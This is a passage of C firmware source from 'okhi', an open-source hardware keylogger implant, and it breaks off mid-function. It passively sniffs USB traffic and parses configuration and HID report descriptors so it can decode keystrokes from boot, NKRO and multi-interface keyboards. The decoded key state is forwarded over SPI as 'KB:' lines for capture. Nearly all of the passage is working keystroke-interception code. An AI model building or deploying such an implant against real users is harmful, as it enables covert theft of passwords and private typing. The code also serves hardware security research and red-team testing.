/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
*/

#ifndef USB_HID_H
#define USB_HID_H

// Keyboards in any HID report format: the boot layout, longer key arrays, NKRO bitmaps, report
// IDs, several keyboard interfaces. The PC reads the device's configuration descriptor and each
// interface's HID report descriptor over EP0 when it enumerates it; core 1 follows those control
// transfers on the wire, parses the descriptors into a map of where the modifier bits and the key
// usages sit in each report, and from then on decodes every report of that device with it. Fields
// on other usage pages (mouse axes and buttons, consumer and vendor controls) carry no key, so
// mouse and media reports of a composite device are ignored instead of read as keys.
//
// What is forwarded is the device's whole key state, the union of all its keyboard reports, as
//
//     KB: 0x<addr> 0x<modifiers>[ 0x<usage>]...;
//
// on every change, keys in the order they were pressed. The union is needed because a key can
// move between reports (okhi-kbd MULTI spreads its keys over report IDs 1 and 2 by usage order)
// and because a second interface sends an empty report whenever the first one changes.
//
// A device whose configuration was not seen (the implant started after it enumerated) keeps the
// raw path in print_packet(): 8-byte reports forwarded as the boot layout, longer ones flagged.
// Once its configuration is seen, only its HID interrupt endpoints can carry keys.

#define HID_DEVICES 4
#define HID_IFACES 8
#define HID_REPORTS 32
#define HID_FIELDS 48
#define HID_SOURCES 12
#define HID_KEYS 32
#define HID_DESC_MAX 1024
#define HID_REPORT_MAX 256
#define HID_STACK 4
#define HID_SEGS 32
#define HID_IDS 32
#define HID_CTRL 2

#define HID_PAGE_KEYBOARD 0x07
#define HID_USAGE_MOD_FIRST 0xE0
#define HID_USAGE_MOD_LAST 0xE7

enum
{
    HID_BITS,  // one bit per usage, from usage
    HID_ARRAY, // count slots of size bits, each holding a logical value
};

typedef struct
{
    uint16_t bit;   // first bit, counted in the report after its ID byte
    uint16_t usage; // keyboard usage of bit 0 (HID_BITS) or of logical value lmin (HID_ARRAY)
    uint16_t count; // bits (HID_BITS) or slots (HID_ARRAY)
    uint8_t size;   // bits per slot
    uint8_t kind;
    uint8_t sign; // the slots hold signed values: the item's Logical Minimum is negative
    int32_t lmin;
    int32_t lmax;
} hid_field_t;

typedef struct
{
    uint8_t iface;  // index in ifaces[]
    uint8_t id;     // 0 when the interface has no report IDs
    uint16_t bytes; // input report length after the ID byte
    uint8_t first;  // first field in fields[]
    uint8_t n;      // fields; 0 for a report with no key in it
} hid_report_t;

typedef struct
{
    uint8_t number;
    uint8_t ep; // interrupt IN endpoint number, 0 when it has none
    uint8_t subclass;
    uint8_t protocol;
    uint8_t hid;    // an HID interface
    uint8_t ids;    // its reports carry report IDs
    uint8_t parsed; // its report descriptor was parsed
    uint8_t boot;   // the PC selected the boot protocol (SET_PROTOCOL 0) on this boot interface
    uint8_t tog;    // DATA PID of the last packet on its endpoint, 0 for none since its toggle reset
    uint8_t keep;   // the transfer in progress is being collected (it lost no packet)
    uint16_t sum;   // checksum of that last packet
    uint16_t got;   // bytes of the transfer in progress, lost packets counted, 0 between transfers
    uint16_t maxp;
    uint16_t rdlen; // report descriptor length, from the HID descriptor
    uint16_t rlen;  // longest input report with its ID byte: what the PC asks for in one transfer
} hid_iface_t;

typedef struct
{
    uint8_t iface;
    uint8_t id;
    uint8_t mod;
    uint8_t n;
    uint8_t keys[HID_KEYS];
} hid_source_t;

typedef struct
{
    uint8_t used;
    uint8_t addr;
    uint8_t maxp0;
    uint8_t configured; // its configuration descriptor was parsed
    uint8_t n_ifaces;
    uint8_t n_reports;
    uint8_t n_fields;
    uint8_t n_sources;
    uint8_t mod; // the union of every source
    uint8_t n;
    uint8_t keys[HID_KEYS];
    uint8_t desc[18]; // its device descriptor, to know it again after a reset (hid_park())
    uint8_t desc_len;
    uint32_t stamp;
    hid_iface_t ifaces[HID_IFACES];
    hid_report_t reports[HID_REPORTS];
    hid_field_t fields[HID_FIELDS];
    hid_source_t sources[HID_SOURCES];
} hid_device_t;

static hid_device_t hid_devices[HID_DEVICES];
static uint32_t hid_clock;
// The maps changed since hid_store_save() last ran: a configuration or a report descriptor
// parsed, a device that kept its maps at a new address, a configured device gone.
static bool hid_store_dirty;

// Core 1 runs all of this on a 2 KB stack (__StackOneBottom to __StackOneTop), so the big
// temporaries are static: nothing here is reentrant or runs on core 0.
static hid_field_t hid_fields_tmp[HID_FIELDS];
static char hid_frame[SPI_FRAME_SIZE];

// A control read being collected. Two can be in flight: the PC interleaves control transfers to
// two devices behind a hub, one enumerating while the driver of the other reads its descriptors.
typedef struct
{
    uint8_t active;
    uint8_t addr;
    uint8_t type;  // descriptor type: 1 device, 2 configuration, 0x22 HID report
    uint8_t index; // interface number for a report descriptor
    uint8_t last_pid;
    uint16_t want; // wLength
    uint16_t len;
    uint32_t stamp; // when it started or last got data
    uint8_t buf[HID_DESC_MAX];
} hid_ctrl_t;

static hid_ctrl_t hid_ctrl[HID_CTRL];

// The packets of a transfer longer than its endpoint's packets, for one endpoint at a time.
static struct
{
    uint8_t addr;
    uint8_t ep;
    uint16_t len; // 0 when nothing is being collected
    uint8_t buf[HID_REPORT_MAX];
} hid_long;

static void usb_report_dispatch(const char *frame);
static void hid_ship(const hid_device_t *d);
static void hid_union(hid_device_t *d);

// A device leaves its slot. If it still had keys down, it ships an empty state, so a page that
// tracks it does not keep them held.
static void hid_release(hid_device_t *d)
{
    if (d->used && d->configured)
    {
        hid_store_dirty = true;
    }

    if (d->used && (d->n || d->mod))
    {
        d->n = 0;
        d->mod = 0;
        hid_ship(d);
    }

    if (d->used && hid_long.len && hid_long.addr == d->addr)
    {
        hid_long.len = 0;
    }

    memset(d, 0, sizeof(*d));
}

static hid_device_t *hid_find(uint8_t addr)
{
    for (int i = 0; i < HID_DEVICES; i++)
    {
        if (hid_devices[i].used && hid_devices[i].addr == addr)
        {
            hid_devices[i].stamp = ++hid_clock;
            return &hid_devices[i];
        }
    }

    return NULL;
}

// A free slot, or the one used least recently.
static hid_device_t *hid_take(uint8_t addr)
{
    hid_device_t *d = hid_find(addr);

    if (d)
    {
        return d;
    }

    d = &hid_devices[0];

    for (int i = 0; i < HID_DEVICES; i++)
    {
        if (!hid_devices[i].used)
        {
            d = &hid_devices[i];
            break;
        }

        if (hid_devices[i].stamp < d->stamp)
        {
            d = &hid_devices[i];
        }
    }

    hid_release(d);
    d->used = 1;
    d->addr = addr;
    d->stamp = ++hid_clock;
    return d;
}

// The device at this address is gone.
static void hid_forget(uint8_t addr)
{
    hid_device_t *d = hid_find(addr);

    if (d)
    {
        hid_release(d);
    }
}

static hid_iface_t *hid_iface_by_number(hid_device_t *d, uint8_t number)
{
    for (int i = 0; i < d->n_ifaces; i++)
    {
        if (d->ifaces[i].number == number)
        {
            return &d->ifaces[i];
        }
    }

    return NULL;
}

static hid_iface_t *hid_iface_by_ep(hid_device_t *d, uint8_t ep)
{
    for (int i = 0; i < d->n_ifaces; i++)
    {
        if (d->ifaces[i].ep == ep)
        {
            return &d->ifaces[i];
        }
    }

    return NULL;
}

// The endpoint of an interface starts over at DATA0 (SET_CONFIGURATION, SET_INTERFACE,
// CLEAR_FEATURE, a bus reset): forget its last packet and the transfer in progress.
static void hid_restart(hid_iface_t *f, uint8_t addr)
{
    f->tog = 0;
    f->got = 0;
    f->keep = 0;

    if (hid_long.len && hid_long.addr == addr && hid_long.ep == f->ep)
    {
        hid_long.len = 0;
    }
}

// A configured device lost its address: a bus reset, or that address given to the device being
// enumerated. A PC often brings the same device back without reading its report descriptors again
// (Windows reselects the configuration after a port reset, ckb-next resets the port with the HID
// driver detached, os_resetusb()), so its maps wait under an address no device has, bit 7 set, until a device
// gives the same device descriptor (hid_adopt()) or its old address carries interrupt traffic on
// one of its endpoints again (usb_hid_in()).
static void hid_park(hid_device_t *d)
{
    if (d->n || d->mod)
    {
        d->n = 0;
        d->mod = 0;
        hid_ship(d);
    }

    for (int k = 0; k < d->n_ifaces; k++)
    {
        d->ifaces[k].boot = 0;
        hid_restart(&d->ifaces[k], d->addr);
    }

    d->n_sources = 0;
    d->addr |= 0x80;
}

// A device that is not configured yet gave its whole device descriptor: if a parked device had the
// same 18 bytes, it is that device and takes its maps. A configuration read afterwards keeps them
// for the interfaces whose number and endpoint did not move, and a report descriptor read replaces
// them.
static void hid_adopt(hid_device_t *d)
{
    for (int i = 0; d->desc_len == 18 && !d->configured && i < HID_DEVICES; i++)
    {
        hid_device_t *p = &hid_devices[i];

        if (p != d && p->used && (p->addr & 0x80) && p->configured && p->desc_len == 18 &&
            memcmp(p->desc, d->desc, 18) == 0)
        {
            uint8_t addr = d->addr;
            uint32_t stamp = d->stamp;

            *d = *p;
            d->addr = addr;
            d->stamp = stamp;
            memset(p, 0, sizeof(*p));
            hid_store_dirty = true;
            printf("usb hid: 0x%x has the device descriptor of a device reset before, its maps kept\r\n", addr);
            return;
        }
    }
}

// Drop the key sources of one interface: the keys its reports held.
static void hid_drop_sources(hid_device_t *d, uint8_t idx)
{
    uint8_t n_sources = 0;

    for (int s = 0; s < d->n_sources; s++)
    {
        if (d->sources[s].iface != idx)
        {
            d->sources[n_sources++] = d->sources[s];
        }
    }

    d->n_sources = n_sources;
}

// Drop the reports, fields and key sources of one interface, keeping the pools packed.
static void hid_drop_iface(hid_device_t *d, uint8_t idx)
{
    uint8_t n_reports = 0, n_fields = 0;
    hid_field_t *fields = hid_fields_tmp;

    for (int r = 0; r < d->n_reports; r++)
    {
        hid_report_t rep = d->reports[r];

        if (rep.iface == idx)
        {
            continue;
        }

        uint8_t first = n_fields;

        for (int f = 0; f < rep.n && rep.first + f < d->n_fields; f++)
        {
            fields[n_fields++] = d->fields[rep.first + f];
        }

        rep.first = first;
        d->reports[n_reports++] = rep;
    }

    memcpy(d->fields, fields, n_fields * sizeof(fields[0]));
    d->n_reports = n_reports;
    d->n_fields = n_fields;
    hid_drop_sources(d, idx);
}

// ---- configuration descriptor -----------------------------------------------------------

static void hid_parse_config(hid_device_t *d, const uint8_t *buf, int len)
{
    static hid_iface_t all[16];
    static hid_iface_t ifaces[HID_IFACES];
    int n_all = 0, n = 0;
    hid_iface_t *cur = NULL;

    memset(all, 0, sizeof(all));
    memset(ifaces, 0, sizeof(ifaces));

    for (int i = 0; i + 2 <= len;)
    {
        int bl = buf[i];
        int type = buf[i + 1];

        if (bl < 2 || i + bl > len)
        {
            break;
        }

        if (type == 4 && bl >= 9)
        {
            // Alternate setting 0 only: the one the PC uses for a keyboard.
            cur = NULL;

            if (buf[i + 3] == 0 && n_all < 16)
            {
                cur = &all[n_all++];
                cur->number = buf[i + 2];
                cur->hid = buf[i + 5] == 3;
                cur->subclass = buf[i + 6];
                cur->protocol = buf[i + 7];
            }
        }
        else if (type == 0x21 && bl >= 9 && cur)
        {
            // HID descriptor: the class descriptors it lists follow from offset 6, 3 bytes each.
            for (int k = 6; k + 2 < bl; k += 3)
            {
                if (buf[i + k] == 0x22)
                {
                    cur->rdlen = buf[i + k + 1] | (buf[i + k + 2] << 8);
                    break;
                }
            }
        }
        else if (type == 5 && bl >= 7 && cur)
        {
            uint8_t ep = buf[i + 2];

            if ((ep & 0x80) && (buf[i + 3] & 3) == 3 && cur->ep == 0)
            {
                cur->ep = ep & 0x0f;
                cur->maxp = (buf[i + 4] | (buf[i + 5] << 8)) & 0x7ff;
            }
        }

        i += bl;
    }

    // The HID interfaces, then the others that have an interrupt IN endpoint: their packets are
    // then known to carry no key. An interface with neither matters to nothing here.
    for (int pass = 0; pass < 2; pass++)
    {
        for (int k = 0; k < n_all && n < HID_IFACES; k++)
        {
            if (pass == 0 ? all[k].hid : (!all[k].hid && all[k].ep))
            {
                ifaces[n++] = all[k];
            }
        }
    }

    // Keep what was parsed for an interface whose number, endpoint and report descriptor length did
    // not change (the PC reads the configuration again), and drop the rest. Reports then point at the
    // interface's new index.
    int8_t moved[HID_IFACES];

    for (int j = 0; j < d->n_ifaces; j++)
    {
        hid_iface_t *old = &d->ifaces[j];

        moved[j] = -1;

        for (int k = 0; k < n && old->parsed && moved[j] < 0; k++)
        {
            if (ifaces[k].number == old->number && ifaces[k].ep == old->ep && ifaces[k].rdlen == old->rdlen &&
                !ifaces[k].parsed)
            {
                moved[j] = (int8_t)k;
                ifaces[k].parsed = 1;
                ifaces[k].ids = old->ids;
                ifaces[k].rlen = old->rlen;
                ifaces[k].boot = old->boot;
            }
        }

        if (moved[j] < 0)
        {
            hid_drop_iface(d, (uint8_t)j);
        }
    }

    for (int r = 0; r < d->n_reports; r++)
    {
        d->reports[r].iface = (uint8_t)moved[d->reports[r].iface];
    }

    if (hid_long.len && hid_long.addr == d->addr)
    {
        hid_long.len = 0;
    }

    memcpy(d->ifaces, ifaces, sizeof(ifaces));
    d->n_ifaces = (uint8_t)n;
    d->n_sources = 0;
    d->configured = 1;

    printf("usb hid: 0x%x configuration,", d->addr);

    for (int k = 0; k < d->n_ifaces; k++)
    {
        hid_iface_t *f = &d->ifaces[k];
        printf(" if%u %s ep 0x%x %u B%s", f->number,
               !f->hid            ? "not hid"
               : f->protocol == 1 ? "boot keyboard"
               : f->protocol == 2 ? "boot mouse"
                                  : "hid",
               f->ep, f->maxp, k + 1 < d->n_ifaces ? "," : "");
    }

    printf("\r\n");
    hid_store_dirty = true;
}

// ---- HID report descriptor --------------------------------------------------------------

static uint32_t hid_item_value(const uint8_t *p, int size)
{
    uint32_t v = 0;

    for (int k = 0; k < size; k++)
    {
        v |= (uint32_t)p[k] << (8 * k);
    }

    return v;
}

static int32_t hid_item_signed(uint32_t v, int size)
{
    if (size == 1)
    {
        return (int8_t)v;
    }

    if (size == 2)
    {
        return (int16_t)v;
    }

    return (int32_t)v;
}

typedef struct
{
    uint32_t page;
    int32_t lmin;
    int32_t lmax;
    uint32_t lmax_raw;
    uint32_t size;
    uint32_t count;
    uint32_t id;
} hid_globals_t;

// Where the next input field of each report ID starts, in bits after the ID byte.
typedef struct
{
    uint8_t id;
    uint32_t bits;
} hid_offset_t;

static hid_report_t *hid_report_for(hid_device_t *d, uint8_t iface, uint8_t id, bool create)
{
    for (int r = 0; r < d->n_reports; r++)
    {
        if (d->reports[r].iface == iface && d->reports[r].id == id)
        {
            return &d->reports[r];
        }
    }

    if (!create || d->n_reports >= HID_REPORTS)
    {
        return NULL;
    }

    hid_report_t *rep = &d->reports[d->n_reports++];
    memset(rep, 0, sizeof(*rep));
    rep->iface = iface;
    rep->id = id;
    rep->first = d->n_fields;
    return rep;
}

// A new field joins its report, and the fields of one report stay contiguous in the pool: a
// report's first field goes at the end, a later one right after its others, moving down the fields
// of the reports that follow (two input items of one ID split by an item of another ID).
static void hid_add_field(hid_device_t *d, hid_report_t *rep, const hid_field_t *f)
{
    if (d->n_fields >= HID_FIELDS)
    {
        return;
    }

    if (rep->n == 0)
    {
        rep->first = d->n_fields;
    }

    int at = rep->first + rep->n;

    memmove(&d->fields[at + 1], &d->fields[at], (d->n_fields - at) * sizeof(hid_field_t));
    d->fields[at] = *f;
    d->n_fields++;

    for (int r = 0; r < d->n_reports; r++)
    {
        if (&d->reports[r] != rep && d->reports[r].n && d->reports[r].first >= at)
        {
            d->reports[r].first++;
        }
    }

    rep->n++;
}

// Bits from bit on for the keyboard usages from usage on, merged into the field before them when
// they carry on from it.
static void hid_add_bits(hid_device_t *d, hid_report_t *rep, uint32_t bit, uint32_t usage, uint32_t count)
{
    hid_field_t *last = rep->n ? &d->fields[rep->first + rep->n - 1] : NULL;

    if (last && last->kind == HID_BITS && last->bit + last->count == bit && last->usage + last->count == usage &&
        last->count + count <= 0xffff)
    {
        last->count += count;
        return;
    }

    hid_field_t f = {
        .bit = (uint16_t)bit, .usage = (uint16_t)usage, .count = (uint16_t)count, .size = 1, .kind = HID_BITS};
    hid_add_field(d, rep, &f);
}

// Array slots whose logical values lo to hi select the keyboard usages from usage on.
static void hid_add_array(hid_device_t *d, hid_report_t *rep, uint32_t bit, const hid_globals_t *g, uint32_t usage,
                          int64_t lo, int64_t hi)
{
    if ((usage >> 16) != HID_PAGE_KEYBOARD || hi < lo)
    {
        return;
    }

    hid_field_t f = {.bit = (uint16_t)bit,
                     .usage = usage & 0xffff,
                     .count = (uint16_t)g->count,
                     .size = (uint8_t)g->size,
                     .kind = HID_ARRAY,
                     .sign = g->lmin < 0,
                     .lmin = (int32_t)lo,
                     .lmax = (int32_t)hi};
    hid_add_field(d, rep, &f);
}

// The usages of the next main item, in order: a Usage is one, a Usage Minimum and Maximum pair a
// run of them, and runs that carry on from each other are merged. One main item may hold several
// (HyperX and Truly Ergonomic keyboards give one Input of 112 bits the modifiers E0 to E7, then the
// keys 00 to 67).
typedef struct
{
    uint32_t first; // page << 16 | usage
    uint32_t n;     // usages; 0 for a Usage Minimum with no Maximum, which takes what the item has
    uint8_t ext;    // an extended usage, which carries its own page
} hid_seg_t;

static hid_seg_t hid_segs[HID_SEGS];
static int hid_n_segs;

static void hid_seg_add(uint32_t first, uint32_t n, bool ext)
{
    hid_seg_t *last = hid_n_segs ? &hid_segs[hid_n_segs - 1] : NULL;

    if (last && last->n && n && last->ext == ext && last->first + last->n == first)
    {
        last->n += n;
    }
    else if (hid_n_segs < HID_SEGS)
    {
        hid_segs[hid_n_segs].first = first;
        hid_segs[hid_n_segs].n = n;
        hid_segs[hid_n_segs].ext = ext;
        hid_n_segs++;
    }
}

static void hid_parse_report(hid_device_t *d, uint8_t idx, const uint8_t *p, int len)
{
    static hid_globals_t stack[HID_STACK];
    static hid_offset_t offsets[HID_IDS];
    hid_globals_t g;
    int sp = 0, n_offsets = 0;
    uint32_t umin = 0;
    bool have_min = false, min_ext = false, ids = false;

    hid_n_segs = 0;

    memset(&g, 0, sizeof(g));
    hid_drop_iface(d, idx);

    for (int i = 0; i < len;)
    {
        uint8_t prefix = p[i++];

        if (prefix == 0xfe)
        {
            // long item: data size, tag, data
            if (i + 2 > len)
            {
                break;
            }

            i += 2 + p[i];
            continue;
        }

        int size = (prefix & 3) == 3 ? 4 : (prefix & 3);

        if (i + size > len)
        {
            break;
        }

        uint32_t v = hid_item_value(&p[i], size);
        int32_t sv = hid_item_signed(v, size);
        int type = (prefix >> 2) & 3;
        int tag = prefix >> 4;

        i += size;

        if (type == 1)
        {
            switch (tag)
            {
                case 0:
                    g.page = v;
                    break;
                case 1:
                    g.lmin = sv;
                    break;
                case 2:
                    g.lmax = sv;
                    g.lmax_raw = v;
                    break;
                case 7:
                    g.size = v;
                    break;
                case 8:
                    g.id = v & 0xff;
                    ids = true;
                    break;
                case 9:
                    g.count = v;
                    break;
                case 10:
                    if (sp < HID_STACK)
                    {
                        stack[sp++] = g;
                    }
                    break;
                case 11:
                    if (sp > 0)
                    {
                        g = stack[--sp];
                    }
                    break;
            }

            continue;
        }

        if (type == 2)
        {
            // An extended usage (4 bytes) carries its page in the high half.
            bool ext = size == 4;
            uint32_t u = ext ? v : (((g.page & 0xffff) << 16) | (v & 0xffff));

            if (tag == 0)
            {
                hid_seg_add(u, 1, ext);
            }
            else if (tag == 1)
            {
                umin = u;
                min_ext = ext;
                have_min = true;
            }
            else if (tag == 2 && have_min)
            {
                if (u >= umin && (u >> 16) == (umin >> 16))
                {
                    hid_seg_add(umin, u - umin + 1, min_ext);
                }

                have_min = false;
            }

            continue;
        }

        if (type != 0)
        {
            continue;
        }

        if (tag == 8)
        {
            // A usage of one or two bytes takes the usage page in effect at the main item (HID 1.11
            // 6.2.2.8, what Windows does), so a page declared after its usages applies to them. Like
            // Linux, walk back from the last usage and stop at one that has that page already, so a
            // page changed between two usages still holds for the ones after it.
            uint32_t page = (g.page & 0xffff) << 16;

            if (have_min)
            {
                hid_seg_add(umin, 0, min_ext); // a Usage Minimum with no Maximum
            }

            for (int k = hid_n_segs - 1; k >= 0; k--)
            {
                if (hid_segs[k].ext)
                {
                    continue;
                }

                if ((hid_segs[k].first & 0xffff0000u) == page)
                {
                    break;
                }

                hid_segs[k].first = page | (hid_segs[k].first & 0xffff);
            }

            // Input: count fields of size bits, at the running offset of the current report ID.
            hid_offset_t *off = NULL;

            for (int k = 0; k < n_offsets; k++)
            {
                if (offsets[k].id == g.id)
                {
                    off = &offsets[k];
                }
            }

            if (!off && n_offsets < HID_IDS)
            {
                off = &offsets[n_offsets++];
                off->id = (uint8_t)g.id;
                off->bits = 0;
            }

            // An item too big for any report pushes the rest of its report out of reach.
            uint32_t bits = g.size <= 32 && g.count <= 4096 ? g.size * g.count : HID_REPORT_MAX * 8 + 1;
            bool constant = v & 1;
            bool variable = v & 2;
            int32_t lmax = (g.lmin >= 0 && g.lmax < 0) ? (int32_t)g.lmax_raw : g.lmax;
            hid_report_t *rep = off ? hid_report_for(d, idx, (uint8_t)g.id, true) : NULL;

            // A 1-bit array with logical values 0 and 1 can only ever select its second usage: Topre,
            // Mistel, Redragon and SiGma keyboards mean a bitmap by it (Linux patches each one's
            // descriptor to say so), so it is read as one.
            bool bitmap = g.size == 1 && (variable || (g.lmin == 0 && lmax == 1 && g.count > 1));

            if (rep && !constant && bits && off->bits + bits <= HID_REPORT_MAX * 8)
            {
                if (bitmap)
                {
                    // One bit per usage, the usages in order.
                    uint32_t at = 0;

                    for (int k = 0; k < hid_n_segs && at < g.count; k++)
                    {
                        uint32_t n = hid_segs[k].n && hid_segs[k].n < g.count - at ? hid_segs[k].n : g.count - at;

                        if ((hid_segs[k].first >> 16) == HID_PAGE_KEYBOARD)
                        {
                            hid_add_bits(d, rep, off->bits + at, hid_segs[k].first & 0xffff, n);
                        }

                        at += n;
                    }
                }
                else if (!variable && g.size >= 1 && g.size <= 16 && g.count <= 255)
                {
                    // Array: logical value Logical Minimum + k selects the k-th usage, one field per
                    // run. A value past the last usage selects nothing, as in Linux. A keyboard array
                    // whose Logical Maximum stops short of its usages (Ortek keyboards, a Skycable
                    // wireless presenter and an Aureal keyboard declare 1 for usages up to 0x65 or
                    // 0x92; Linux rewrites each one's descriptor by VID:PID) is read up to its last
                    // usage.
                    int64_t at = g.lmin;
                    int64_t last = g.lmin - 1;
                    bool ranges = hid_n_segs > 0;

                    for (int k = 0; k < hid_n_segs; k++)
                    {
                        ranges = ranges && hid_segs[k].n && (hid_segs[k].first >> 16) == HID_PAGE_KEYBOARD;
                        last += hid_segs[k].n;
                    }

                    int64_t top = ranges && lmax >= g.lmin && last > lmax ? last : lmax;

                    for (int k = 0; k < hid_n_segs && at <= top; k++)
                    {
                        int64_t n = hid_segs[k].n ? (int64_t)hid_segs[k].n : top - at + 1;
                        int64_t hi = at + n - 1 < top ? at + n - 1 : top;

                        hid_add_array(d, rep, off->bits, &g, hid_segs[k].first, at, hi);
                        at += n;
                    }
                }
            }

            if (off)
            {
                off->bits += bits;

                uint32_t bytes = (off->bits + 7) / 8;

                if (rep && bytes > rep->bytes)
                {
                    rep->bytes = bytes > 0xffff ? 0xffff : (uint16_t)bytes;
                }
            }
        }

        // Every main item ends the local items.
        hid_n_segs = 0;
        have_min = false;
    }

    hid_iface_t *f = &d->ifaces[idx];
    f->ids = ids;
    f->parsed = 1;
    f->rlen = 0;

    for (int k = 0; k < n_offsets; k++)
    {
        uint32_t bytes = (offsets[k].bits + 7) / 8 + (ids ? 1 : 0);

        if (bytes > f->rlen)
        {
            f->rlen = bytes > 0xffff ? 0xffff : (uint16_t)bytes;
        }
    }

    printf("usb hid: 0x%x if%u report descriptor %d B, input up to %u B:", d->addr, f->number, len, f->rlen);

    for (int r = 0; r < d->n_reports; r++)
    {
        hid_report_t *rep = &d->reports[r];

        if (rep->iface != idx)
        {
            continue;
        }

        printf(" id %u %u B", rep->id, rep->bytes);

        for (int k = 0; k < rep->n; k++)
        {
            hid_field_t *fl = &d->fields[rep->first + k];
            printf(fl->kind == HID_BITS ? " bits %u from 0x%x" : " array %u from 0x%x", fl->count, fl->usage);
        }

        printf(rep->n ? ";" : " no keys;");
    }

    printf("\r\n");
    hid_store_dirty = true;
}

// ---- control transfers on EP0 -----------------------------------------------------------

static hid_ctrl_t *hid_ctrl_of(uint8_t addr)
{
    for (int i = 0; i < HID_CTRL; i++)
    {
        if (hid_ctrl[i].active && hid_ctrl[i].addr == addr)
        {
            return &hid_ctrl[i];
        }
    }

    return NULL;
}

static void hid_ctrl_finish(hid_ctrl_t *c)
{
    if (!c || !c->active)
    {
        return;
    }

    c->active = 0;

    int len = c->len;
    const uint8_t *b = c->buf;
    bool cut = len >= HID_DESC_MAX; // longer than the buffer: what fit is parsed

    if (c->type == 1 && len >= 8)
    {
        hid_device_t *d = hid_take(c->addr);
        d->maxp0 = b[7];

        if (len >= 18 || d->desc_len < 18)
        {
            d->desc_len = (uint8_t)(len < 18 ? len : 18);
            memcpy(d->desc, b, d->desc_len);
        }

        hid_adopt(d);

        if (len >= 12)
        {
            printf("usb hid: 0x%x device %04x:%04x, ep0 %u B\r\n", d->addr, b[8] | (b[9] << 8), b[10] | (b[11] << 8),
                   d->maxp0);
        }
    }
    else if (c->type == 2 && len >= 9)
    {
        int total = b[2] | (b[3] << 8);

        if (len >= total || cut)
        {
            // Read at the address of a parked device that nothing else holds: it is that device
            // (the RP restarted under it, or a tool reads its configuration after a reset), and
            // it keeps the maps of the interfaces that did not change.
            hid_device_t *p = c->addr && !hid_find(c->addr) ? hid_find(c->addr | 0x80) : NULL;

            if (p)
            {
                p->addr = c->addr;
                printf("usb hid: 0x%x configuration read at its address, its maps kept\r\n", c->addr);
            }

            hid_parse_config(hid_take(c->addr), b, len < total ? len : total);
        }
    }
    else if (c->type == 0x22 && len > 0)
    {
        hid_device_t *d = hid_find(c->addr);
        hid_iface_t *f = d ? hid_iface_by_number(d, c->index) : NULL;

        if (f && (f->rdlen == 0 || len >= f->rdlen || cut))
        {
            hid_parse_report(d, (uint8_t)(f - d->ifaces), b, f->rdlen && f->rdlen < len ? f->rdlen : len);
        }
        else
        {
            printf("usb hid: 0x%x if%u report descriptor of %d B not used (%s)\r\n", c->addr, c->index, len,
                   !d   ? "no configuration seen"
                   : !f ? "no such interface"
                        : "short");
        }
    }
}

// The 8 bytes of a SETUP's DATA0.
static void usb_hid_setup(uint8_t addr, const uint8_t *s)
{
    uint8_t type = s[0], req = s[1];
    uint16_t value = s[2] | (s[3] << 8);
    uint16_t index = s[4] | (s[5] << 8);
    uint16_t length = s[6] | (s[7] << 8);

    // A new request to a device ends the control read it had in flight.
    hid_ctrl_finish(hid_ctrl_of(addr));

    if (req == 6 && ((type == 0x80 && (value == 0x0100 || value == 0x0200)) || (type == 0x81 && (value >> 8) == 0x22)))
    {
        // GET_DESCRIPTOR: the device descriptor, the first configuration (the one the PC selects)
        // or an HID report descriptor. It takes a free slot, else one that never got data (a
        // device on another hub port, whose answers are not on this wire), else the stalest.
        hid_ctrl_t *c = NULL;

        for (int i = 0; i < HID_CTRL && !c; i++)
        {
            if (!hid_ctrl[i].active)
            {
                c = &hid_ctrl[i];
            }
        }

        for (int pass = 0; pass < 2 && !c; pass++)
        {
            for (int i = 0; i < HID_CTRL; i++)
            {
                if ((pass || hid_ctrl[i].len == 0) && (!c || hid_ctrl[i].stamp < c->stamp))
                {
                    c = &hid_ctrl[i];
                }
            }
        }

        hid_ctrl_finish(c);
        c->active = 1;
        c->addr = addr;
        c->type = value >> 8;
        c->index = (uint8_t)index;
        c->want = length;
        c->len = 0;
        c->last_pid = 0xff;
        c->stamp = ++hid_clock;
    }
    else if (type == 0x00 && req == 5)
    {
        // SET_ADDRESS: whatever had the new address before leaves it (a configured device is parked:
        // it may be this one coming back), and the device takes it with what is known of it (the
        // EP0 size its descriptor gave at the default address).
        uint8_t to = value & 0x7f;
        hid_device_t *d;

        if (to != addr)
        {
            hid_device_t *o = hid_find(to);

            if (o && o->configured)
            {
                hid_park(o);
            }
            else if (o)
            {
                hid_release(o);
            }

            d = hid_find(addr);

            if (d && to)
            {
                d->addr = to;
            }
            else if (d)
            {
                hid_forget(addr);
            }
        }
    }
    else if (type == 0x00 && req == 9)
    {
        // SET_CONFIGURATION: every endpoint starts over at DATA0.
        hid_device_t *d = hid_find(addr);

        for (int k = 0; d && k < d->n_ifaces; k++)
        {
            hid_restart(&d->ifaces[k], addr);
        }
    }
    else if ((type == 0x01 && req == 11) || (type == 0x02 && req == 1 && value == 0 && (index & 0x80)))
    {
        // SET_INTERFACE, or CLEAR_FEATURE(ENDPOINT_HALT) on an IN endpoint: it starts over at DATA0.
        hid_device_t *d = hid_find(addr);
        hid_iface_t *f = !d             ? NULL
                         : type == 0x01 ? hid_iface_by_number(d, (uint8_t)index)
                                        : hid_iface_by_ep(d, index & 0x0f);

        if (f)
        {
            hid_restart(f, addr);
        }
    }
    else if (type == 0x21 && req == 0x0b)
    {
        // SET_PROTOCOL, meaningful on a boot interface only.
